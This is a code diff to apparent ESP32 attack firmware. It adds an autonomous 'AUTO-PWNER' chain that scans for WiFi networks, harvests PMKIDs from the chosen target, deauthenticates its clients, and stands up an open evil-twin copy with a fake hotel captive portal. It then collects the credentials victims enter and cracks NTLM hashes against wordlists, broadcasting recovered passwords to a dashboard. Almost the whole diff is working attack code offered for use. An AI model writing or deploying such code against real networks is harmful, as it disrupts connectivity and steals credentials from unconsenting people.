@@ -5,6 +5,7 @@
 #include "camera_engine.h"
 #include "web_dashboard.h"
 #include "storage_manager.h"
+#include "crack_engine.h"
 #include "esp_log.h"
 #include "esp_timer.h"
 #include "freertos/FreeRTOS.h"
@@ -342,6 +343,218 @@ done:
     ESP_LOGI(TAG, "═══ Chain D complete ═══");
 }
 
+/* ── Chain E: AUTO-PWNER — Full autonomous attack chain ───────────── */
+/* DEF CON showstopper: scan → PMKID harvest → deauth → evil twin (hotel portal)
+   → capture creds → auto-crack in background → live WebSocket alerts      */
+
+static void auto_crack_task(void *arg)
+{
+    char *hash_line = (char *)arg;
+    if (!hash_line) vTaskDelete(NULL);
+
+    /* Quick sanity: expect 32-hex NTLM hash */
+    if (strlen(hash_line) >= 32) {
+        crack_result_t result;
+        esp_err_t ret = crack_engine_crack(hash_line, HASH_TYPE_NTLM,
+                                           FILE_WORDLIST_10K, &result);
+        if (ret == ESP_OK && result.found) {
+            char evt[256];
+            snprintf(evt, sizeof(evt),
+                "{\"hash\":\"%s\",\"password\":\"%s\",\"attempts\":%lu,\"ms\":%lu}",
+                hash_line, result.password,
+                (unsigned long)result.attempts,
+                (unsigned long)result.duration_ms);
+            web_dashboard_broadcast("cracked", evt);
+            ESP_LOGI("AUTO", "\U0001f513 CRACKED: %s = '%s' (%lu ms)",
+                     hash_line, result.password, (unsigned long)result.duration_ms);
+        } else {
+            /* Try bigger wordlist */
+            ret = crack_engine_crack(hash_line, HASH_TYPE_NTLM,
+                                     FILE_WORDLIST_100K, &result);
+            if (ret == ESP_OK && result.found) {
+                char evt[256];
+                snprintf(evt, sizeof(evt),
+                    "{\"hash\":\"%s\",\"password\":\"%s\",\"attempts\":%lu,\"ms\":%lu}",
+                    hash_line, result.password,
+                    (unsigned long)result.attempts,
+                    (unsigned long)result.duration_ms);
+                web_dashboard_broadcast("cracked", evt);
+            } else {
+                char evt[128];
+                snprintf(evt, sizeof(evt),
+                    "{\"hash\":\"%s\",\"found\":false}", hash_line);
+                web_dashboard_broadcast("crack_failed", evt);
+            }
+        }
+    }
+    free(hash_line);
+    vTaskDelete(NULL);
+}
+
+static void chain_auto_pwner(void)
+{
+    ESP_LOGI(TAG, "\u2588\u2588\u2588 Chain E: AUTO-PWNER \u2588\u2588\u2588");
+    web_dashboard_broadcast("chain",
+        "{\"name\":\"AUTO-PWNER\",\"status\":\"started\","
+        "\"steps\":[\"scan\",\"pmkid\",\"deauth\",\"evil_twin\",\"capture\",\"crack\"]}");
+
+    /* ── Step 1: Scan ── */
+    ESP_LOGI(TAG, "[1/7] Scanning WiFi environment...");
+    web_dashboard_broadcast("autopwn", "{\"step\":\"scan\",\"status\":\"active\"}");
+    wifi_engine_set_mode(WIFI_MODE_SCANNER);
+    wifi_scan_start();
+    vTaskDelay(pdMS_TO_TICKS(8000));  /* 8s scan for thorough results */
+
+    viper_ap_t results[WIFI_MAX_SCAN_RESULTS];
+    uint16_t count = WIFI_MAX_SCAN_RESULTS;
+    wifi_scan_get_results(results, &count);
+
+    if (count == 0) {
+        ESP_LOGW(TAG, "AUTO-PWNER: No networks found");
+        web_dashboard_broadcast("autopwn", "{\"step\":\"scan\",\"status\":\"failed\",\"reason\":\"no_networks\"}");
+        goto done;
+    }
+
+    /* Broadcast scan results */
+    char scan_evt[256];
+    snprintf(scan_evt, sizeof(scan_evt),
+        "{\"step\":\"scan\",\"status\":\"done\",\"found\":%d}", count);
+    web_dashboard_broadcast("autopwn", scan_evt);
+
+    /* ── Step 2: Pick best target (highest RSSI, non-open) ── */
+    int best = -1;
+    int best_rssi = -100;
+    for (int i = 0; i < count; i++) {
+        if (results[i].rssi > best_rssi && results[i].authmode != WIFI_AUTH_OPEN) {
+            best_rssi = results[i].rssi;
+            best = i;
+        }
+    }
+    if (best < 0) best = 0;  /* Fallback: pick strongest regardless */
+
+    char target_evt[256];
+    char bssid_str[18];
+    wifi_mac_to_str(results[best].bssid, bssid_str);
+    snprintf(target_evt, sizeof(target_evt),
+        "{\"step\":\"target\",\"ssid\":\"%s\",\"bssid\":\"%s\",\"ch\":%d,\"rssi\":%d}",
+        results[best].ssid, bssid_str,
+        results[best].channel, results[best].rssi);
+    web_dashboard_broadcast("autopwn", target_evt);
+    ESP_LOGI(TAG, "[2/7] Target: '%s' (%s) ch=%d rssi=%d",
+             results[best].ssid, bssid_str,
+             results[best].channel, results[best].rssi);
+
+    /* ── Step 3: PMKID harvest (10s) ── */
+    ESP_LOGI(TAG, "[3/7] PMKID harvest (10s)...");
+    web_dashboard_broadcast("autopwn", "{\"step\":\"pmkid\",\"status\":\"active\"}");
+    wifi_engine_set_mode(WIFI_MODE_PMKID_HARVEST);
+    wifi_pmkid_harvest_start(results[best].bssid);
+    vTaskDelay(pdMS_TO_TICKS(10000));
+    wifi_pmkid_harvest_stop();
+    web_dashboard_broadcast("autopwn", "{\"step\":\"pmkid\",\"status\":\"done\"}");
+
+    /* ── Step 4: Deauth clients off target AP ── */
+    ESP_LOGI(TAG, "[4/7] Deauthing clients from '%s'...", results[best].ssid);
+    web_dashboard_broadcast("autopwn", "{\"step\":\"deauth\",\"status\":\"active\"}");
+    wifi_engine_set_mode(WIFI_MODE_DEAUTH);
+    wifi_deauth_start(results[best].bssid, NULL, results[best].channel, 50, 6000);
+    vTaskDelay(pdMS_TO_TICKS(6000));
+    wifi_engine_stop_current();
+    web_dashboard_broadcast("autopwn", "{\"step\":\"deauth\",\"status\":\"done\"}");
+
+    /* ── Step 5: Evil Twin with hotel portal ── */
+    ESP_LOGI(TAG, "[5/7] Evil Twin: '%s' with hotel portal", results[best].ssid);
+    web_dashboard_broadcast("autopwn",
+        "{\"step\":\"evil_twin\",\"status\":\"active\",\"portal\":\"hotel\"}");
+
+    evil_twin_cfg_t etc = {
+        .authmode = WIFI_AUTH_OPEN,   /* Open so victims can always connect */
+        .channel  = results[best].channel,
+        .deauth_legit = true,
+    };
+    strncpy(etc.ssid, results[best].ssid, sizeof(etc.ssid) - 1);
+    memcpy(etc.legit_bssid, results[best].bssid, 6);
+    wifi_engine_set_mode(WIFI_MODE_EVIL_TWIN);
+    wifi_eviltwin_start(&etc);
+
+    /* Start captive portal with hotel template */
+    captive_portal_start("hotel");
+
+    /* ── Step 6: Harvest credentials (45s) ── */
+    ESP_LOGI(TAG, "[6/7] Harvesting credentials (45s)...");
+    web_dashboard_broadcast("autopwn", "{\"step\":\"harvest\",\"status\":\"active\"}");
+
+    size_t last_cred_size = 0;
+    {
+        FILE *f = fopen(FILE_CREDS, "rb");
+        if (f) { fseek(f, 0, SEEK_END); last_cred_size = ftell(f); fclose(f); }
+    }
+
+    uint8_t clients_seen = 0;
+    for (int s = 0; s < 45; s++) {
+        vTaskDelay(pdMS_TO_TICKS(1000));
+
+        /* Check if new client connected */
+        uint8_t c = wifi_eviltwin_get_client_count();
+        if (c > clients_seen) {
+            clients_seen = c;
+            char cc_evt[64];
+            snprintf(cc_evt, sizeof(cc_evt), "{\"step\":\"client\",\"count\":%d}", c);
+            web_dashboard_broadcast("autopwn", cc_evt);
+            ESP_LOGI(TAG, "  Client #%d connected to Evil Twin!", c);
+        }
+
+        /* Check for new credentials */
+        size_t new_size = 0;
+        FILE *f = fopen(FILE_CREDS, "rb");
+        if (f) { fseek(f, 0, SEEK_END); new_size = ftell(f); fclose(f); }
+
+        if (new_size > last_cred_size) {
+            last_cred_size = new_size;
+            web_dashboard_broadcast("autopwn",
+                "{\"step\":\"credential\",\"status\":\"captured\"}");
+            ESP_LOGI(TAG, "  \u2705 NEW CREDENTIAL CAPTURED!");
+        }
+    }
+
+    wifi_engine_stop_current();
+    captive_portal_stop();
+    web_dashboard_broadcast("autopwn", "{\"step\":\"harvest\",\"status\":\"done\"}");
+
+    /* ── Step 7: Auto-crack hashes ── */
+    ESP_LOGI(TAG, "[7/7] Auto-cracking captured hashes...");
+    web_dashboard_broadcast("autopwn", "{\"step\":\"crack\",\"status\":\"active\"}");
+    {
+        char hash_buf[4096];
+        size_t hlen = 0;
+        if (storage_read_file(FILE_HASHES, (uint8_t *)hash_buf, sizeof(hash_buf) - 1, &hlen) == ESP_OK && hlen > 0) {
+            hash_buf[hlen] = '\0';
+            /* Spawn a background crack task for the first hash line */
+            char *nl = strchr(hash_buf, '\n');
+            if (nl) *nl = '\0';
+            /* Extract hash value from JSONL: {"hash":"XXXXXX"} */
+            char *hv = strstr(hash_buf, "\"hash\":\"");
+            if (hv) {
+                hv += 8;
+                char *he = strchr(hv, '"');
+                if (he) {
+                    *he = '\0';
+                    char *hash_copy = strdup(hv);
+                    if (hash_copy) {
+                        xTaskCreate(auto_crack_task, "autocrack", 8192, hash_copy, 2, NULL);
+                    }
+                }
+            }
+        }
+    }
+
+done:
+    s_chains_executed++;
+    web_dashboard_broadcast("chain",
+        "{\"name\":\"AUTO-PWNER\",\"status\":\"done\"}");
+    ESP_LOGI(TAG, "\u2588\u2588\u2588 Chain E: AUTO-PWNER complete \u2588\u2588\u2588");
+}
+
 /* ── Chain execution ────────────────────────────── */
 
 static void chain_task(void *arg)
@@ -354,6 +567,7 @@ static void chain_task(void *arg)
         case CHAIN_PLUG_AND_PWN:         chain_plug_and_pwn(); break;
         case CHAIN_CONFERENCE_RECON:     chain_conference_recon(); break;
         case CHAIN_BLE_MITM:             chain_ble_mitm(); break;
+        case CHAIN_AUTO_PWNER:           chain_auto_pwner(); break;
         default: break;
     }
 
